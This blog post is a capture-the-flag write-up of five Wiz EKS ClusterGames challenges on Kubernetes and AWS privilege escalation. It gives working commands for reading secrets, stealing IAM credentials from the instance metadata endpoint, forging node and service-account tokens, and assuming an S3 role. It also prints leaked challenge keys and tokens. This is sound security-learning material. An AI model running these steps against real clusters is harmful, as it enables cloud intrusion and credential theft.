---
layout: post
title:  "EKS ClusterGames Writeups"
date:   2025-08-29 09:41:40 +0530
tags: ["cloud security","kubernetes"]
categories: 
---

I will be discussing my approaches for solving [EKS ClusterGames](https://eksclustergames.com/) challenges. So let's start....
### Challenge 1: Secret Seeker

`Description`: Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?

Permissions:
```
{
    "secrets": [
        "get",
        "list"
    ]
}
```

![rbac_error](/assets/eks/rbac_error.png)

So, here is the RBAC (Role-Based Access Control) issue in Kubernetes. What is RBAC?
> *`Role-Based Access Control (RBAC)`* in Kubernetes is a security mechanism that regulates who can access what resources within a Kubernetes cluster and what actions they can perform on those resources.

It means we cannot access resources like pods, replicasets or deployments. It only grants permission to `get` and `list` secrets [refer to the permissions].

> A `Secret` is an object that contains a small amount of sensitive data such as a password, a token, or a key [reference](https://kubernetes.io/docs/concepts/configuration/secret/)

Now, list the secrets..

![secrets](/assets/eks/secrets.png) 

![flag](/assets/eks/flag.png) 
Decoded the base64 and got the flag.

flag: `wiz_eks_challenge{omg_over_privileged_secret_access}`

### Challenge 2: Registry Hunt

`Description`: A thing we learned during our research: always check the container registries. For your convenience, the crane utility is already pre-installed on the machine.

Permissions:
```
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```
In this challenge, we have the permissions to `list` the pods. 
``` 
kubectl get pods
NAME                    READY   STATUS    RESTARTS      AGE
database-pod-14f9769b   1/1     Running   9 (28d ago)   355d
```

- This time we dont have permission to list the secrets 
![no_perm](/assets/eks/no_perm.png)

- According to the description, we need to check `container registeries`. So let's look at the detailed view of the pod. 

- `kubectl get pods database-pod-14f9769b -o yaml`

![imagePull](/assets/eks/imagePull.png)

- In the above image, we have the image:`eksclustergames/base_ext_image` and need to pull it. But how ?

![imagePull_failure](/assets/eks/imagePull_failure.png)
- We need to authenticate first, but from where we can get the credentials? 
> The answer lies in `secrets`. But we can't list them, then how? When a pod needs to pull an image from a private registry, its Pod specification references the image pull secret in the `imagePullSecrets` field 

- Now, we got the secret name...
- `kubectl get secrets  registry-pull-secrets-16ae8e51 -o yaml`

![secrets_chall2](/assets/eks/secrets_chall2.png)

![base64d](/assets/eks/base64d.png)

- `echo ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==  | base64 -d`

- `eksclustergames:dckr_[.....]5iYQj8FuCo` -> The format is username:password

- `crane auth login docker.io -u eksclustergames -p dckr_[.......]5iYQj8FuCo `

- `crane pull eksclustergames/base_ext_image ./image.tar
`
![flag2](/assets/eks/flag2.png)

flag: `wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}`

### Challenge 3: Image Inquistion 

`Description`: A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.

Remember: You are running inside a compromised EKS pod.

Permissions:
```
{
    "pods": [
        "list",
        "get"
    ]
}
```
- This time no permission to secrets. :(

```
kubectl get pods 
NAME                      READY   STATUS    RESTARTS   AGE
accounting-pod-acbd5209   1/1     Running   0          13d
```

- `A pod's image holds more than just code` interesting!

```
kubectl get pods accounting-pod-acbd5209  -o yaml | grep image    
  - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
    imagePullPolicy: IfNotPresent
    image: sha256:c5e09ea1551a1976284b15c1d5e856cbda91b98e04a7e88f517a182f29b0c914
    imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
```
The challenge description says to `deep dive into its ECR reposioty`. Let's look at what ECR repo is. 

>Amazon Elastic Container Registry (ECR) is a fully managed container image registry service provided by Amazon Web Services (AWS). It is used to store, manage, and deploy Docker container images. In the context of Kubernetes, ECR repositories serve as the source from which Kubernetes clusters, particularly those running on AWS services like Amazon Elastic Kubernetes Service (EKS), pull container images to deploy and run applications.

- The repo URL looks like 
`<aws_account_id>.dkr.ecr.<region>.amazonaws.com/<repository_name>`

So we have to pull the exact image from the ECR. 


{% highlight python %}
 > crane pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-579b0b7/manifests/sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4 ./image.tar

 Error: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/v2/central_repo-579b0b7/manifests/sha256/manifests/78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4: unexpected status code 401 Unauthorized: Not Authorized
{% endhighlight %}

We need the credentials. How can we get them?

I got this command from exploring a bit. 
`aws ecr get-login-password --region us-west-1` 
But, it doesn't work and told me to use `aws configure`, that means my AWS is not configured yet.

- Another way is to check if IAM role is attached to this instance, by making a request to `IMDS (Instance Metadata Service)`.

- `curl 169.254.169.254/latest/meta-data/` 

![iam](/assets/eks/iam.png)

So, we can see `iam` is present. Cool, let's dig further. 

> Security Concerns: If an attacker inside your pod/VM can reach 169.254.169.254, they might steal IAM role credentials. And we are going to do the same :p

{% highlight python %}
 > curl 169.254.169.254/latest/meta-data/iam/security-credentials/
 eks-challenge-cluster-nodegroup-NodeInstanceRole
{% endhighlight %}

![creds](/assets/eks/creds.png)

{% highlight python %}
 > aws ecr get-login-password --region us-west-1 
 eyJwYXlsb2FkIjoiOXBOZUM4RkczSUtRTm5UT[.........]cGUiOiJEQVRBX0tFWSIsImV4cGlyYXRpb24iOjE3NTYyODM3ODl9
{% endhighlight %}


{% highlight python %}
 > aws ecr get-login-password --region us-west-1 | crane auth login -u AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
 2025/08/26 20:46:46 logged in via /home/user/.docker/config.json
{% endhighlight %}

Now execute the command...

{% highlight python %}
 > crane pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-579b0b7/manifests/sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4 ./image.tar
{% endhighlight %}

- After pulling the image, I tried reading the image digests (as I did in challenge 2). In one of the digests, I got the flag, but it was incorrect :( 
- So, I looked bit more and read the description again, that says: `inspect the image layers`
- Then, I looked at `manifest` of the image. Found nothing useful. 
- Another important document is `config`- It contains the runtime metadata for the container. 

{% highlight python %}
 > crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4 | jq .
{% endhighlight %}

And here is the flag...

flag: `wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future}`

In this challenge, we retrieved credentials from the I`nstance Metadata Service (IMDS)`. 

### Challenge 4: Pod Break 

`Description`: You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?

- This time, no permissions are sepcified beforehand.

- First, we will try to check if IAM role is attached to it. 

![iam1](/assets/eks/iam1.png) 

- So, IAM role is present. 
- Now, how can we make use of this information?
- The description says: `Can you navigate your way to access the EKS Node's privileged service-account`. What is meant by `privilged account` here? Refer to this link 

[Node Authorisation](https://kubernetes.io/docs/reference/access-authn-authz/node/)

When I run this,
{% highlight python %}
 > kubectl whoami
  system:serviceaccount:challenge4:service-account-challenge4
{% endhighlight %}

- So, we need `system:node` instead of `system:serviceaccount`. 
- I found out this blog: https://blog.calif.io/p/privilege-escalation-in-eks 
- So, I needed to generate the token but i didn't had the cluster-name. I tried googling a bit but couldn't find of much help. At last, I was forced to use a hint, and it helped me to get the cluster name. 
![hint](/assets/eks/hint.png) 

{% highlight python %}
  > aws eks get-token --cluster-name eks-challenge-cluster 
{% endhighlight %}

It gave me a token and that I will be using to get the privileged role.

{% highlight python %}
  > kubectl whoami --token "$TOKEN" 
  system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal
{% endhighlight %}

{% highlight python %}
  > kubectl get pods --token "$TOKEN"
  No resources found in challenge4 namespace.
{% endhighlight %}

{% highlight python %}
  > kubectl get secrets --token "$TOKEN"
  NAME        TYPE     DATA   AGE
  node-flag   Opaque   1      666d
{% endhighlight %}

![chal4](/assets/eks/chal4.png) 

Finally, decode the base64 encoded flag string.

flag: `wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}`

### Challenge 5: Container Secrets Infrastructure

`Description`: You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the `s3access-sa` service account, and get the flag?

IAM Policy:
```
{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
```
Trust Policy:
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com"
                }
            }
        }
    ]
}
```
Permissions:
```
{
    "secrets": [
        "get",
        "list"
    ],
    "serviceaccounts": [
        "get",
        "list"
    ],
    "pods": [
        "get",
        "list"
    ],
    "serviceaccounts/token": [
        "create"
    ]
}
```
In this challenge, some permissions are allowed for listing pods, serviceaccounts, and secrets. The most interesting permission this time is `serviceaccounts/token`: means we can even create the token for existing service accounts, effectively escalating privileges.

{% highlight python %}
  > kubectl whoami
  system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal
{% endhighlight %}

{% highlight python %}
  > kubectl get serviceaccounts
    NAME          SECRETS   AGE
    debug-sa      0         356d
    default       0         356d
    s3access-sa   0         356d
{% endhighlight %}

{% highlight python %}
 > kubectl get sa debug-sa -o yaml
 apiVersion: v1
 kind: ServiceAccount
 metadata:
  annotations:
    description: This is a dummy service account with empty policy attached
    eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
  creationTimestamp: "2023-10-31T20:07:37Z"
  name: debug-sa
  namespace: challenge5
  resourceVersion: "671929"
  uid: 6cb6024a-c4da-47a9-9050-59c8c7079904
{% endhighlight %}

- `debug-sa` has IAM role attached, `challengeTestRole-fc9d18e`

{% highlight python %}
 > kubectl get sa s3access-sa -o yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
  creationTimestamp: "2023-10-31T20:07:34Z"
  name: s3access-sa
  namespace: challenge5
  resourceVersion: "671916"
  uid: 86e44c49-b05a-4ebe-800b-45183a6ebbda
{% endhighlight %}
- `s3access-sa` has IAM role attached, `challengeEksS3Role`
- Now, check the permissions.

![auth_cani](/assets/eks/auth_cani.png) 

- Only `debug-sa` has the permission to create the token. Now, we will create the token with `debug-sa` service account and assume the identity of `s3access-sa` and then we will read the flag from the bucket. Let's see how we can execute this.

- Let's generate the token first: 

{% highlight python %}
 > kubectl create token debug-sa
   eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhMWQxODI0NWVkMzNkOGQzN2ZmNTIzNjg0NWU5OGMzYzRhYzliZGUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc1NjQ5MzQ5NCwiaWF0IjoxNzU2NDg5ODk0LCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLXdlc3QtMS5hbWF6b25hd3MuY29tL2lkL0MwNjJDMjA3QzhGNTBERTRFQzI0QTM3MkZGNjBFNTg5IiwianRpIjoiOWI1MDQ3NTAtYTk5MS00ODJhLTkyYmMtOWUwNDU1YzE4NjhjIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjaGFsbGVuZ2U1Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlYnVnLXNhIiwidWlkIjoiNmNiNjAyNGEtYzRkYS00N2E5LTkwNTAtNTljOGM3MDc5OTA0In19LCJuYmYiOjE3NTY0ODk4OTQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjaGFsbGVuZ2U1OmRlYnVnLXNhIn0.TwJMcCfvYfCsH0hbrAm1zSX1tBKW-KSrkRZC5XJmM8-I92RXex4hLUlb-H5pKUFzGaZf_6pgsdQarP6DL8Sw1PuRBdyR_n-2UC7Wxkx0rfO3Wdp223UiIvY_b4HtXJS3I9l-Og1a0LHS5YrKooIuePVibwdQ5f9oGF1yoEIrFgMCbPrtSBwjS4v9pZUJ_dx2MXowWvgiIJJLweK_AK4c1n2DLhBVOq2YhHQvOfJ7uA8gRTSa7KRTGmmpEery6aOnCzTb-_v7JG-YQAxv7NUMeI2aHNu7M9oAGryE5gwH4Ld9JXA3zqLb-NIJ-e_qKvpLCf-iR4GwStOa1R1rp4Gkvg
{% endhighlight %}

- Now, with this token, let's assume the identity of `s3access-sa`

![webID](/assets/eks/webID.png) 

- Why is this error coming up? 
> For the audience validation to succeed, the token_reviewer_jwt used by Vault to perform the TokenReview must have the correct audience. If the Kubernetes API server's --api-audiences flag is not set, the token_reviewer_jwt must have the default audience, such as `https://kubernetes.default.svc`. This requirement applies whether Vault is running inside or outside the Kubernetes cluster. [link](https://support.hashicorp.com/hc/en-us/articles/34458984727443-Audience-parameter-usage-with-kube-auth-in-vault-with-caveats)

- Let's verify this statement...
- Open [jwt.io](https://jwt.io) and see the decoded payload

{% highlight python %}
 {
  "aud": [
    "https://kubernetes.default.svc"
  ],
  "exp": 1756493494,
  "iat": 1756489894,
  "iss": "https://oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
  "jti": "9b504750-a991-482a-92bc-9e0455c1868c",
  "kubernetes.io": {
    "namespace": "challenge5",
    "serviceaccount": {
      "name": "debug-sa",
      "uid": "6cb6024a-c4da-47a9-9050-59c8c7079904"
    }
  },
  "nbf": 1756489894,
  "sub": "system:serviceaccount:challenge5:debug-sa"
 }
{% endhighlight %}
- In the `aud`, we can see the audience type `https://kubernetes.default.svc` but according to the trust policy provided, audience type should be `sts.amazonaws.com`

{% highlight python %}
 > kubectl create token debug-sa --audience sts.amazonaws.com
 eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhMWQxODI0NWVkMzNkOGQzN2ZmNTIzNjg0NWU5OGMzYzRhYzliZGUifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzU2NDk0NTE1LCJpYXQiOjE3NTY0OTA5MTUsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJqdGkiOiI1YzFlM2NlMi03MDI3LTRkNjYtYTk3MS1kODNiMzA3ZmVlYzYiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTc1NjQ5MDkxNSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.kKbtVmYIf4FhC66gL_i_bBpg0TPVl6YyYC9NK140n-5vCOYih-npASypvgf2MZhLkiuqkFvnNtHuZcn_ZLxc8aU7Ph5Zr0Ilb_7oRHADq_YsFkOehLEpgzj4A-zgIK4nW7WsQWhqzGCZFzhknawv6TVHIQAtEwUiz6NAjScGMlQZCzL3AigfOn0lLtQ96QlQ22tpxVpJKTmDYTJsx0DyrUPJpMDzXpncd2YNYfJs50IrU3jPvPNZ3bePsT7ggLU8fqAtMB6f8DlKClFXuJiDZMNGnjXtBtivEzuwE7_ADp-ErvspzfbLVPfC-iWFq8AvdANCClnc71JQgajcVCnAkw
{% endhighlight %}

- `TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhMWQxO[..........]c71JQgajcVCnAkw"`

![assumed](/assets/eks/assumed.png) 

- Configure aws with the given creds..
{% highlight python %}
 > export AWS_ACCESS_KEY_ID="ASIA2AVYNEVM5OOAXBK6"
 > export AWS_SECRET_ACCESS_KEY="Ng6wpD7LjG30pOavNvpmcfXBEouM0KpOHDqsjRnz"
 > export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEGoaCXVzLXdlc3QtMSJHM[...........]dUsBCOHX/6RKq58JytdJyCG4Ujm6uNVMu41TG8="
{% endhighlight %}

- Verify it with the follwing command:
{% highlight python %}
 > aws sts get-caller-identity
 { 
    "UserId": "AROA2AVYNEVMZEZ2AFVYI:challenge5",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/challenge5"
 }
{% endhighlight %}
- `s3access-sa` role has been assumed now... yay!
- Now, extract and read the flag from the s3 bucket. 

- `aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag -`

flag: `wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}`


Finally, I was able to solve all the challenges. They were really well-designed and contributed significantly to my understanding of the security aspects of EKS and Kubernetes.

![certi](/assets/eks/certi.png) 

Thank you for bearing with me, and I hope you liked it. Your suggestions are highly appreciated.

### References
- https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/#pivoting-to-the-cloud-environment-by-stealing-pod-identities
- https://seifrajhi.github.io/blog/kubernetes-rbac-privilege-escalation-mitigation/
- https://blog.calif.io/p/privilege-escalation-in-eks